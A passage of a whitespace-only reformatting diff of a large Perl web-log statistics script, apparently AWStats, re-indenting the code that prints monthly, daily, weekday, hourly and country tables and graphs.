 				if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
 					$mot = CleanXSS(
-									 DecodeKey_decodeutfkeys(
-												 $key, $PageCode || 'iso-8859-1'
-									 )
+						DecodeKey_decodeutfkeys(
+							$key, $PageCode || 'iso-8859-1'
+						)
 					);
 				}
 				else { $mot = CleanXSS( DecodeEncodedString($key) ); }
@@ -15541,7 +15689,7 @@ if ( scalar keys %HTMLOutput ) {
 				$total_h = 0;
 				my $count = 0;
 				&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_sider404_h,
-							   \%_sider404_h );
+					\%_sider404_h );
 				foreach my $key (@keylist) {
 					my $nompage = XMLEncode( CleanXSS($key) );
 
@@ -15606,18 +15754,18 @@ if ( scalar keys %HTMLOutput ) {
 				my $count = 0;
 				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
 					&BuildKeyList(
-								   $MaxRowsInHTMLOutput,
-								   $MinHitExtra[$extranum],
-								   \%{ '_section_' . $extranum . '_h' },
-								   \%{ '_section_' . $extranum . '_p' }
+						$MaxRowsInHTMLOutput,
+						$MinHitExtra[$extranum],
+						\%{ '_section_' . $extranum . '_h' },
+						\%{ '_section_' . $extranum . '_p' }
 					);
 				}
 				else {
 					&BuildKeyList(
-								   $MaxRowsInHTMLOutput,
-								   $MinHitExtra[$extranum],
-								   \%{ '_section_' . $extranum . '_h' },
-								   \%{ '_section_' . $extranum . '_h' }
+						$MaxRowsInHTMLOutput,
+						$MinHitExtra[$extranum],
+						\%{ '_section_' . $extranum . '_h' },
+						\%{ '_section_' . $extranum . '_h' }
 					);
 				}
 				my %keysinkeylist = ();
@@ -15642,16 +15790,16 @@ if ( scalar keys %HTMLOutput ) {
 					if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
 						print "<td>"
 						  . Format_Bytes(
-									 ${ '_section_' . $extranum . '_k' }{$key} )
+							${ '_section_' . $extranum . '_k' }{$key} )
 						  . "</td>";
 					}
 					if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
 						print "<td>"
 						  . (
-							  ${ '_section_' . $extranum . '_l' }{$key}
-							  ? Format_Date(
-								  ${ '_section_' . $extranum . '_l' }{$key}, 1 )
-							  : '-'
+							${ '_section_' . $extranum . '_l' }{$key}
+							? Format_Date(
+								${ '_section_' . $extranum . '_l' }{$key}, 1 )
+							: '-'
 						  )
 						  . "</td>";
 					}
@@ -15660,8 +15808,8 @@ if ( scalar keys %HTMLOutput ) {
 				}
 
 				# If we ask average or sum, we loop on all other records
-				if (    $ExtraAddAverageRow[$extranum]
-					 || $ExtraAddSumRow[$extranum] )
+				if (   $ExtraAddAverageRow[$extranum]
+					|| $ExtraAddSumRow[$extranum] )
 				{
 					foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
 						if ( $keysinkeylist{$_} ) { next; }
@@ -15688,9 +15836,11 @@ if ( scalar keys %HTMLOutput ) {
 					}
 					if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
 						print "<td>"
-						  . ( $count
-							  ? Format_Bytes( $total_k / $count )
-							  : "&nbsp;" )
+						  . (
+							$count
+							? Format_Bytes( $total_k / $count )
+							: "&nbsp;"
+						  )
 						  . "</td>";
 					}
 					if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
@@ -15789,7 +15939,7 @@ if ( scalar keys %HTMLOutput ) {
 			if ( $TotalVisits > 0 ) {
 				$RatioBytes =
 				  int( ( $TotalBytes / 1024 ) * 100 /
-					   ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;
+					  ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;
 			}
 
 			my $colspan = 5;
@@ -15805,10 +15955,11 @@ if ( scalar keys %HTMLOutput ) {
 "<td class=\"aws\"><b>$Message[133]</b></td><td class=\"aws\" colspan=\""
 			  . ( $colspan - 1 ) . "\">\n";
 			print( $MonthRequired eq 'all'
-				   ? "$Message[6] $YearRequired"
-				   : "$Message[5] "
-					 . $MonthNumLib{$MonthRequired}
-					 . " $YearRequired" );
+				? "$Message[6] $YearRequired"
+				: "$Message[5] "
+				  . $MonthNumLib{$MonthRequired}
+				  . " $YearRequired"
+			);
 			print "</td></tr>\n";
 			print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
 			print "<td class=\"aws\"><b>$Message[8]</b></td>\n";
@@ -15884,11 +16035,12 @@ if ( scalar keys %HTMLOutput ) {
 				print "<td>&nbsp;<br />&nbsp;</td>\n";
 				if ( $ShowSummary =~ /H/i ) {
 					print "<td><b>$TotalHits</b>"
-					  . ( $LogType eq 'M'
-						  ? ""
-						  : "<br />($RatioHits&nbsp;"
-							. lc( $Message[57] . "/" . $Message[12] )
-							. ")" )
+					  . (
+						$LogType eq 'M'
+						? ""
+						: "<br />($RatioHits&nbsp;"
+						  . lc( $Message[57] . "/" . $Message[12] ) . ")"
+					  )
 					  . "</td>";
 				}
 				else { print "<td>&nbsp;</td>"; }
@@ -15907,9 +16059,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowSummary =~ /U/i ) {
 					print "<td>"
-					  . ( $MonthRequired eq 'all'
-						  ? "<b>&lt;= $TotalUnique</b><br />$Message[129]"
-						  : "<b>$TotalUnique</b><br />&nbsp;" )
+					  . (
+						$MonthRequired eq 'all'
+						? "<b>&lt;= $TotalUnique</b><br />$Message[129]"
+						: "<b>$TotalUnique</b><br />&nbsp;"
+					  )
 					  . "</td>";
 				}
 				else { print "<td>&nbsp;</td>"; }
@@ -15927,12 +16081,13 @@ if ( scalar keys %HTMLOutput ) {
 				else { print "<td>&nbsp;</td>"; }
 				if ( $ShowSummary =~ /H/i ) {
 					print "<td><b>$TotalHits</b>"
-					  . ( $LogType eq 'M'
-						  ? ""
-						  : "<br />($RatioHits&nbsp;"
-							. $Message[57] . "/"
-							. $Message[12]
-							. ")" )
+					  . (
+						$LogType eq 'M'
+						? ""
+						: "<br />($RatioHits&nbsp;"
+						  . $Message[57] . "/"
+						  . $Message[12] . ")"
+					  )
 					  . "</td>";
 				}
 				else { print "<td>&nbsp;</td>"; }
@@ -15987,8 +16142,8 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				print "</tr>\n";
 			}
-			&tab_end(    $LogType eq 'W'
-					  || $LogType eq 'S' ? "* $Message[159]" : "" );
+			&tab_end($LogType eq 'W'
+				  || $LogType eq 'S' ? "* $Message[159]" : "" );
 		}
 
 		# BY MONTH
@@ -16047,9 +16202,9 @@ if ( scalar keys %HTMLOutput ) {
 					  "$MonthNumLib{$monthix}\�$YearRequired";
 				}
 				my @vallabel = (
-								 "$Message[11]", "$Message[10]",
-								 "$Message[56]", "$Message[57]",
-								 "$Message[75]"
+					"$Message[11]", "$Message[10]",
+					"$Message[56]", "$Message[57]",
+					"$Message[75]"
 				);
 				my @valcolor =
 				  ( "$color_u", "$color_v", "$color_p", "$color_h",
@@ -16076,11 +16231,11 @@ if ( scalar keys %HTMLOutput ) {
 					  || 0;
 				}
 				ShowGraph_graphapplet(
-									   "$title",        "month",
-									   $ShowMonthStats, \@blocklabel,
-									   \@vallabel,      \@valcolor,
-									   \@valmax,        \@valtotal,
-									   \@valaverage,    \@valdata
+					"$title",        "month",
+					$ShowMonthStats, \@blocklabel,
+					\@vallabel,      \@valcolor,
+					\@valmax,        \@valtotal,
+					\@valaverage,    \@valdata
 				);
 			}
 			else {
@@ -16097,47 +16252,47 @@ if ( scalar keys %HTMLOutput ) {
 					if ( $max_v > 0 ) {
 						$bredde_u =
 						  int(
-							 ( $MonthUnique{ $YearRequired . $monthix } || 0 ) /
-							   $max_v * $BarHeight ) + 1;
+							( $MonthUnique{ $YearRequired . $monthix } || 0 ) /
+							  $max_v * $BarHeight ) + 1;
 					}
 					if ( $max_v > 0 ) {
 						$bredde_v =
 						  int(
-							 ( $MonthVisits{ $YearRequired . $monthix } || 0 ) /
-							   $max_v * $BarHeight ) + 1;
+							( $MonthVisits{ $YearRequired . $monthix } || 0 ) /
+							  $max_v * $BarHeight ) + 1;
 					}
 					if ( $max_h > 0 ) {
 						$bredde_p =
 						  int(
-							  ( $MonthPages{ $YearRequired . $monthix } || 0 ) /
-								$max_h * $BarHeight ) + 1;
+							( $MonthPages{ $YearRequired . $monthix } || 0 ) /
+							  $max_h * $BarHeight ) + 1;
 					}
 					if ( $max_h > 0 ) {
 						$bredde_h =
 						  int( ( $MonthHits{ $YearRequired . $monthix } || 0 ) /
-							   $max_h * $BarHeight ) + 1;
+							  $max_h * $BarHeight ) + 1;
 					}
 					if ( $max_k > 0 ) {
 						$bredde_k =
 						  int(
-							  ( $MonthBytes{ $YearRequired . $monthix } || 0 ) /
-								$max_k * $BarHeight ) + 1;
+							( $MonthBytes{ $YearRequired . $monthix } || 0 ) /
+							  $max_k * $BarHeight ) + 1;
 					}
 					print "<td>";
 					if ( $ShowMonthStats =~ /U/i ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vu'}\" height=\"$bredde_u\" width=\"6\""
 						  . AltTitle( "$Message[11]: "
-									. ( $MonthUnique{ $YearRequired . $monthix }
-										|| 0 ) )
+							  . ( $MonthUnique{ $YearRequired . $monthix }
+								  || 0 ) )
 						  . " />";
 					}
 					if ( $ShowMonthStats =~ /V/i ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"6\""
 						  . AltTitle( "$Message[10]: "
-									. ( $MonthVisits{ $YearRequired . $monthix }
-										|| 0 ) )
+							  . ( $MonthVisits{ $YearRequired . $monthix }
+								  || 0 ) )
 						  . " />";
 					}
 					if ( $ShowMonthStats =~ /P/i ) {
@@ -16152,7 +16307,7 @@ if ( scalar keys %HTMLOutput ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
 						  . AltTitle( "$Message[57]: "
-							   . ( $MonthHits{ $YearRequired . $monthix } || 0 )
+							  . ( $MonthHits{ $YearRequired . $monthix } || 0 )
 						  )
 						  . " />";
 					}
@@ -16160,10 +16315,10 @@ if ( scalar keys %HTMLOutput ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
 						  . AltTitle(
-									 "$Message[75]: "
-									   . Format_Bytes(
-										 $MonthBytes{ $YearRequired . $monthix }
-									   )
+							"$Message[75]: "
+							  . Format_Bytes(
+								$MonthBytes{ $YearRequired . $monthix }
+							  )
 						  )
 						  . " />";
 					}
@@ -16190,15 +16345,17 @@ if ( scalar keys %HTMLOutput ) {
 #					}
 #					else {
 					print "<td>"
-					  . ( !$StaticLinks
-							&& $monthix == $nowmonth
-							&& $YearRequired == $nowyear
-						  ? '<font class="currentday">'
-						  : '' );
+					  . (
+						!$StaticLinks
+						  && $monthix == $nowmonth
+						  && $YearRequired == $nowyear
+						? '<font class="currentday">'
+						: ''
+					  );
 					print "$MonthNumLib{$monthix}<br />$YearRequired";
-					print(    !$StaticLinks
-						   && $monthix == $nowmonth
-						   && $YearRequired == $nowyear ? '</font>' : '' );
+					print(   !$StaticLinks
+						  && $monthix == $nowmonth
+						  && $YearRequired == $nowyear ? '</font>' : '' );
 					print "</td>";
 
 					#					}
@@ -16251,15 +16408,17 @@ if ( scalar keys %HTMLOutput ) {
 					my $monthix = sprintf( "%02s", $ix );
 					print "<tr>";
 					print "<td>"
-					  . ( !$StaticLinks
-							&& $monthix == $nowmonth
-							&& $YearRequired == $nowyear
-						  ? '<font class="currentday">'
-						  : '' );
+					  . (
+						!$StaticLinks
+						  && $monthix == $nowmonth
+						  && $YearRequired == $nowyear
+						? '<font class="currentday">'
+						: ''
+					  );
 					print "$MonthNumLib{$monthix} $YearRequired";
-					print(    !$StaticLinks
-						   && $monthix == $nowmonth
-						   && $YearRequired == $nowyear ? '</font>' : '' );
+					print(   !$StaticLinks
+						  && $monthix == $nowmonth
+						  && $YearRequired == $nowyear ? '</font>' : '' );
 					print "</td>";
 					if ( $ShowMonthStats =~ /U/i ) {
 						print "<td>",
@@ -16288,7 +16447,7 @@ if ( scalar keys %HTMLOutput ) {
 					if ( $ShowMonthStats =~ /B/i ) {
 						print "<td>",
 						  Format_Bytes(
-							 int( $MonthBytes{ $YearRequired . $monthix } || 0 )
+							int( $MonthBytes{ $YearRequired . $monthix } || 0 )
 						  ), "</td>";
 					}
 					print "</tr>\n";
@@ -16392,7 +16551,7 @@ if ( scalar keys %HTMLOutput ) {
 
 			# Define average
 			foreach my $daycursor (
-							 $firstdaytocountaverage .. $lastdaytocountaverage )
+				$firstdaytocountaverage .. $lastdaytocountaverage )
 			{
 				$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
 				my $year  = $1;
@@ -16439,17 +16598,17 @@ if ( scalar keys %HTMLOutput ) {
 						next;
 					}    # If not an existing day, go to next
 					my $bold =
-					  (    $day == $nowday
-						&& $month == $nowmonth
-						&& $year == $nowyear ? ':' : '' );
+					  (      $day == $nowday
+						  && $month == $nowmonth
+						  && $year == $nowyear ? ':' : '' );
 					my $weekend =
 					  ( DayOfWeek( $day, $month, $year ) =~ /[06]/ ? '!' : '' );
 					push @blocklabel,
 					  "$day�$MonthNumLib{$month}$weekend$bold";
 				}
 				my @vallabel = (
-								 "$Message[10]", "$Message[56]",
-								 "$Message[57]", "$Message[75]"
+					"$Message[10]", "$Message[56]",
+					"$Message[57]", "$Message[75]"
 				);
 				my @valcolor =
 				  ( "$color_v", "$color_p", "$color_h", "$color_k" );
@@ -16459,9 +16618,10 @@ if ( scalar keys %HTMLOutput ) {
 				$average_p = sprintf( "%.2f", $average_p );
 				$average_h = sprintf( "%.2f", $average_h );
 				$average_k = (
-							   int($average_k)
-							   ? Format_Bytes( sprintf( "%.2f", $average_k ) )
-							   : "0.00" );
+					int($average_k)
+					? Format_Bytes( sprintf( "%.2f", $average_k ) )
+					: "0.00"
+				);
 				my @valaverage =
 				  ( $average_v, $average_p, $average_h, $average_k );
 				my @valdata = ();
@@ -16484,11 +16644,11 @@ if ( scalar keys %HTMLOutput ) {
 					$valdata[ $xx++ ] = $DayBytes{ $year . $month . $day } || 0;
 				}
 				ShowGraph_graphapplet(
-									   "$title",              "daysofmonth",
-									   $ShowDaysOfMonthStats, \@blocklabel,
-									   \@vallabel,            \@valcolor,
-									   \@valmax,              \@valtotal,
-									   \@valaverage,          \@valdata
+					"$title",              "daysofmonth",
+					$ShowDaysOfMonthStats, \@blocklabel,
+					\@vallabel,            \@valcolor,
+					\@valmax,              \@valtotal,
+					\@valaverage,          \@valdata
 				);
 			}
 			else {
@@ -16511,29 +16671,29 @@ if ( scalar keys %HTMLOutput ) {
 					if ( $max_v > 0 ) {
 						$bredde_v =
 						  int( ( $DayVisits{ $year . $month . $day } || 0 ) /
-							   $max_v * $BarHeight ) + 1;
+							  $max_v * $BarHeight ) + 1;
 					}
 					if ( $max_h > 0 ) {
 						$bredde_p =
 						  int( ( $DayPages{ $year . $month . $day } || 0 ) /
-							   $max_h * $BarHeight ) + 1;
+							  $max_h * $BarHeight ) + 1;
 					}
 					if ( $max_h > 0 ) {
 						$bredde_h =
 						  int( ( $DayHits{ $year . $month . $day } || 0 ) /
-							   $max_h * $BarHeight ) + 1;
+							  $max_h * $BarHeight ) + 1;
 					}
 					if ( $max_k > 0 ) {
 						$bredde_k =
 						  int( ( $DayBytes{ $year . $month . $day } || 0 ) /
-							   $max_k * $BarHeight ) + 1;
+							  $max_k * $BarHeight ) + 1;
 					}
 					print "<td>";
 					if ( $ShowDaysOfMonthStats =~ /V/i ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"4\""
 						  . AltTitle( "$Message[10]: "
-							   . int( $DayVisits{ $year . $month . $day } || 0 )
+							  . int( $DayVisits{ $year . $month . $day } || 0 )
 						  )
 						  . " />";
 					}
@@ -16548,17 +16708,17 @@ if ( scalar keys %HTMLOutput ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"4\""
 						  . AltTitle( "$Message[57]: "
-							   . int( $DayHits{ $year . $month . $day } || 0 ) )
+							  . int( $DayHits{ $year . $month . $day } || 0 ) )
 						  . " />";
 					}
 					if ( $ShowDaysOfMonthStats =~ /B/i ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"4\""
 						  . AltTitle(
-									  "$Message[75]: "
-										. Format_Bytes(
-											  $DayBytes{ $year . $month . $day }
-										)
+							"$Message[75]: "
+							  . Format_Bytes(
+								$DayBytes{ $year . $month . $day }
+							  )
 						  )
 						  . " />";
 					}
@@ -16588,9 +16748,10 @@ if ( scalar keys %HTMLOutput ) {
 				$average_p = sprintf( "%.2f", $average_p );
 				$average_h = sprintf( "%.2f", $average_h );
 				$average_k = (
-							   int($average_k)
-							   ? Format_Bytes( sprintf( "%.2f", $average_k ) )
-							   : "0.00" );
+					int($average_k)
+					? Format_Bytes( sprintf( "%.2f", $average_k ) )
+					: "0.00"
+				);
 				if ( $ShowDaysOfMonthStats =~ /V/i ) {
 					print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"4\""
@@ -16628,26 +16789,30 @@ if ( scalar keys %HTMLOutput ) {
 					}    # If not an existing day, go to next
 					my $dayofweekcursor = DayOfWeek( $day, $month, $year );
 					print "<td"
-					  . ( $dayofweekcursor =~ /[06]/
-						  ? " bgcolor=\"#$color_weekend\""
-						  : "" )
+					  . (
+						$dayofweekcursor =~ /[06]/
+						? " bgcolor=\"#$color_weekend\""
+						: ""
+					  )
 					  . ">";
-					print( !$StaticLinks
-							 && $day == $nowday
-							 && $month == $nowmonth
-							 && $year == $nowyear
-						   ? '<font class="currentday">'
-						   : '' );
+					print(
+						!$StaticLinks
+						  && $day == $nowday
+						  && $month == $nowmonth
+						  && $year == $nowyear
+						? '<font class="currentday">'
+						: ''
+					);
 					print "$day<br /><span style=\"font-size: "
 					  . (    $FrameName ne 'mainright'
 						  && $QueryString !~ /buildpdf/i ? "9" : "8" )
 					  . "px;\">"
 					  . $MonthNumLib{$month}
 					  . "</span>";
-					print(    !$StaticLinks
-						   && $day == $nowday
-						   && $month == $nowmonth
-						   && $year == $nowyear ? '</font>' : '' );
+					print(   !$StaticLinks
+						  && $day == $nowday
+						  && $month == $nowmonth
+						  && $year == $nowyear ? '</font>' : '' );
 					print "</td>\n";
 				}
 				print "<td>&nbsp;</td>";
@@ -16697,22 +16862,26 @@ if ( scalar keys %HTMLOutput ) {
 					}    # If not an existing day, go to next
 					my $dayofweekcursor = DayOfWeek( $day, $month, $year );
 					print "<tr"
-					  . ( $dayofweekcursor =~ /[06]/
-						  ? " bgcolor=\"#$color_weekend\""
-						  : "" )
+					  . (
+						$dayofweekcursor =~ /[06]/
+						? " bgcolor=\"#$color_weekend\""
+						: ""
+					  )
 					  . ">";
 					print "<td>"
-					  . ( !$StaticLinks
-							&& $day == $nowday
-							&& $month == $nowmonth
-							&& $year == $nowyear
-						  ? '<font class="currentday">'
-						  : '' );
+					  . (
+						!$StaticLinks
+						  && $day == $nowday
+						  && $month == $nowmonth
+						  && $year == $nowyear
+						? '<font class="currentday">'
+						: ''
+					  );
 					print Format_Date( "$year$month$day" . "000000", 2 );
-					print(    !$StaticLinks
-						   && $day == $nowday
-						   && $month == $nowmonth
-						   && $year == $nowyear ? '</font>' : '' );
+					print(   !$StaticLinks
+						  && $day == $nowday
+						  && $month == $nowmonth
+						  && $year == $nowyear ? '</font>' : '' );
 					print "</td>";
 					if ( $ShowDaysOfMonthStats =~ /V/i ) {
 						print "<td>",
@@ -16735,7 +16904,7 @@ if ( scalar keys %HTMLOutput ) {
 					if ( $ShowDaysOfMonthStats =~ /B/i ) {
 						print "<td>",
 						  Format_Bytes(
-							   int( $DayBytes{ $year . $month . $day } || 0 ) ),
+							int( $DayBytes{ $year . $month . $day } || 0 ) ),
 						  "</td>";
 					}
 					print "</tr>\n";
@@ -16800,7 +16969,7 @@ if ( scalar keys %HTMLOutput ) {
 			my @avg_dayofweek_h  = ();
 			my @avg_dayofweek_k  = ();
 			foreach my $daycursor (
-							 $firstdaytocountaverage .. $lastdaytocountaverage )
+				$firstdaytocountaverage .. $lastdaytocountaverage )
 			{
 				$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
 				my $year  = $1;
@@ -16858,9 +17027,10 @@ if ( scalar keys %HTMLOutput ) {
 				$average_p = sprintf( "%.2f", $average_p );
 				$average_h = sprintf( "%.2f", $average_h );
 				$average_k = (
-							   int($average_k)
-							   ? Format_Bytes( sprintf( "%.2f", $average_k ) )
-							   : "0.00" );
+					int($average_k)
+					? Format_Bytes( sprintf( "%.2f", $average_k ) )
+					: "0.00"
+				);
 				my @valaverage = ( $average_p, $average_h, $average_k );
 				my @valdata    = ();
 				my $xx         = 0;
@@ -16887,11 +17057,11 @@ if ( scalar keys %HTMLOutput ) {
 					}
 				}
 				ShowGraph_graphapplet(
-									   "$title",             "daysofweek",
-									   $ShowDaysOfWeekStats, \@blocklabel,
-									   \@vallabel,           \@valcolor,
-									   \@valmax,             \@valtotal,
-									   \@valaverage,         \@valdata
+					"$title",             "daysofweek",
+					$ShowDaysOfWeekStats, \@blocklabel,
+					\@vallabel,           \@valcolor,
+					\@valmax,             \@valtotal,
+					\@valaverage,         \@valdata
 				);
 			}
 			else {
@@ -16903,54 +17073,54 @@ if ( scalar keys %HTMLOutput ) {
 					my $bredde_k = 0;
 					if ( $max_h > 0 ) {
 						$bredde_p = int(
-										 (
-										     $avg_dayofweek_p[$_] ne '?'
-										   ? $avg_dayofweek_p[$_]
-										   : 0
-										 ) / $max_h * $BarHeight
+							(
+								  $avg_dayofweek_p[$_] ne '?'
+								? $avg_dayofweek_p[$_]
+								: 0
+							) / $max_h * $BarHeight
 						) + 1;
 					}
 					if ( $max_h > 0 ) {
 						$bredde_h = int(
-										 (
-										     $avg_dayofweek_h[$_] ne '?'
-										   ? $avg_dayofweek_h[$_]
-										   : 0
-										 ) / $max_h * $BarHeight
+							(
+								  $avg_dayofweek_h[$_] ne '?'
+								? $avg_dayofweek_h[$_]
+								: 0
+							) / $max_h * $BarHeight
 						) + 1;
 					}
 					if ( $max_k > 0 ) {
 						$bredde_k = int(
-										 (
-										     $avg_dayofweek_k[$_] ne '?'
-										   ? $avg_dayofweek_k[$_]
-										   : 0
-										 ) / $max_k * $BarHeight
+							(
+								  $avg_dayofweek_k[$_] ne '?'
+								? $avg_dayofweek_k[$_]
+								: 0
+							) / $max_k * $BarHeight
 						) + 1;
 					}
 					$avg_dayofweek_p[$_] = sprintf(
-												  "%.2f",
-												  (
-													$avg_dayofweek_p[$_] ne '?'
-													? $avg_dayofweek_p[$_]
-													: 0
-												  )
+						"%.2f",
+						(
+							  $avg_dayofweek_p[$_] ne '?'
+							? $avg_dayofweek_p[$_]
+							: 0
+						)
 					);
 					$avg_dayofweek_h[$_] = sprintf(
-												  "%.2f",
-												  (
-													$avg_dayofweek_h[$_] ne '?'
-													? $avg_dayofweek_h[$_]
-													: 0
-												  )
+						"%.2f",
+						(
+							  $avg_dayofweek_h[$_] ne '?'
+							? $avg_dayofweek_h[$_]
+							: 0
+						)
 					);
 					$avg_dayofweek_k[$_] = sprintf(
-												  "%.2f",
-												  (
-													$avg_dayofweek_k[$_] ne '?'
-													? $avg_dayofweek_k[$_]
-													: 0
-												  )
+						"%.2f",
+						(
+							  $avg_dayofweek_k[$_] ne '?'
+							? $avg_dayofweek_k[$_]
+							: 0
+						)
 					);
 
 					# Remove decimal part that are .0
@@ -16977,7 +17147,7 @@ if ( scalar keys %HTMLOutput ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
 						  . AltTitle( "$Message[75]: "
-									  . Format_Bytes( $avg_dayofweek_k[$_] ) )
+							  . Format_Bytes( $avg_dayofweek_k[$_] ) )
 						  . " />";
 					}
 					print "</td>\n";
@@ -16988,17 +17158,19 @@ if ( scalar keys %HTMLOutput ) {
 					print "<td"
 					  . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
 					  . ">"
-					  . ( !$StaticLinks
-							&& $_ == ( $nowwday - 1 )
-							&& $MonthRequired == $nowmonth
-							&& $YearRequired == $nowyear
-						  ? '<font class="currentday">'
-						  : '' );
+					  . (
+						!$StaticLinks
+						  && $_ == ( $nowwday - 1 )
+						  && $MonthRequired == $nowmonth
+						  && $YearRequired == $nowyear
+						? '<font class="currentday">'
+						: ''
+					  );
 					print $Message[ $_ + 84 ];
-					print(    !$StaticLinks
-						   && $_ == ( $nowwday - 1 )
-						   && $MonthRequired == $nowmonth
-						   && $YearRequired == $nowyear ? '</font>' : '' );
+					print(   !$StaticLinks
+						  && $_ == ( $nowwday - 1 )
+						  && $MonthRequired == $nowmonth
+						  && $YearRequired == $nowyear ? '</font>' : '' );
 					print "</td>";
 				}
 				print "</tr>\n</table>\n";
@@ -17030,17 +17202,19 @@ if ( scalar keys %HTMLOutput ) {
 					  . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
 					  . ">";
 					print "<td>"
-					  . ( !$StaticLinks
-							&& $_ == ( $nowwday - 1 )
-							&& $MonthRequired == $nowmonth
-							&& $YearRequired == $nowyear
-						  ? '<font class="currentday">'
-						  : '' );
+					  . (
+						!$StaticLinks
+						  && $_ == ( $nowwday - 1 )
+						  && $MonthRequired == $nowmonth
+						  && $YearRequired == $nowyear
+						? '<font class="currentday">'
+						: ''
+					  );
 					print $Message[ $_ + 84 ];
-					print(    !$StaticLinks
-						   && $_ == ( $nowwday - 1 )
-						   && $MonthRequired == $nowmonth
-						   && $YearRequired == $nowyear ? '</font>' : '' );
+					print(   !$StaticLinks
+						  && $_ == ( $nowwday - 1 )
+						  && $MonthRequired == $nowmonth
+						  && $YearRequired == $nowyear ? '</font>' : '' );
 					print "</td>";
 					if ( $ShowDaysOfWeekStats =~ /P/i ) {
 						print "<td>", $avg_dayofweek_p[$_], "</td>";
@@ -17102,11 +17276,11 @@ if ( scalar keys %HTMLOutput ) {
 					$valdata[ $xx++ ] = $_time_k[$_] || 0;
 				}
 				ShowGraph_graphapplet(
-									   "$title",        "hours",
-									   $ShowHoursStats, \@blocklabel,
-									   \@vallabel,      \@valcolor,
-									   \@valmax,        \@valtotal,
-									   \@valaverage,    \@valdata
+					"$title",        "hours",
+					$ShowHoursStats, \@blocklabel,
+					\@vallabel,      \@valcolor,
+					\@valmax,        \@valtotal,
+					\@valaverage,    \@valdata
 				);
 			}
 			else {
@@ -17145,7 +17319,7 @@ if ( scalar keys %HTMLOutput ) {
 						print
 "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
 						  . AltTitle(
-							  "$Message[75]: " . Format_Bytes( $_time_k[$ix] ) )
+							"$Message[75]: " . Format_Bytes( $_time_k[$ix] ) )
 						  . " />";
 					}
 					print "</td>\n";
@@ -17282,10 +17456,12 @@ if ( scalar keys %HTMLOutput ) {
 			print "$Center<a name=\"countries\">&nbsp;</a><br />\n";
 			my $title =
 "$Message[25] ($Message[77] $MaxNbOf{'Domain'}) &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=alldomains")
-				  : "$PROG$StaticLinks.alldomains.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=alldomains")
+				: "$PROG$StaticLinks.alldomains.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]</a>";
 			&tab_head( "$title", 19, 0, 'countries' );
 			print
@@ -17331,8 +17507,10 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $_ > $max_k ) { $max_k = $_; }
 			}
 			my $count = 0;
-			&BuildKeyList(          $MaxNbOf{'Domain'}, $MinHit{'Domain'},
-						   \%_domener_h,       \%_domener_p );
+			&BuildKeyList(
+				$MaxNbOf{'Domain'}, $MinHit{'Domain'},
+				\%_domener_h,       \%_domener_p
+			);
 			foreach my $key (@keylist) {
 				my ( $_domener_u, $_domener_v );
 				my $bredde_p = 0;
@@ -17371,10 +17549,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
 				if ( $ShowDomainsStats =~ /U/i ) {
-					$_domener_u =
-					  (   $_domener_p{$key}
+					$_domener_u = (
+						  $_domener_p{$key}
 						? $_domener_p{$key} / $TotalPages
-						: 0 );
+						: 0
+					);
 					$_domener_u += ( $_domener_h{$key} / $TotalHits );
 					$_domener_u =
 					  sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
@@ -17383,10 +17562,11 @@ if ( scalar keys %HTMLOutput ) {
 					  . ")</td>";
 				}
 				if ( $ShowDomainsStats =~ /V/i ) {
-					$_domener_v =
-					  (   $_domener_p{$key}
+					$_domener_v = (
+						  $_domener_p{$key}
 						? $_domener_p{$key} / $TotalPages
-						: 0 );
+						: 0
+					);
 					$_domener_v += ( $_domener_h{$key} / $TotalHits );
 					$_domener_v =
 					  sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
@@ -17440,11 +17620,11 @@ if ( scalar keys %HTMLOutput ) {
 			$rest_p = $TotalPages - $total_p;
 			$rest_h = $TotalHits - $total_h;
 			$rest_k = $TotalBytes - $total_k;
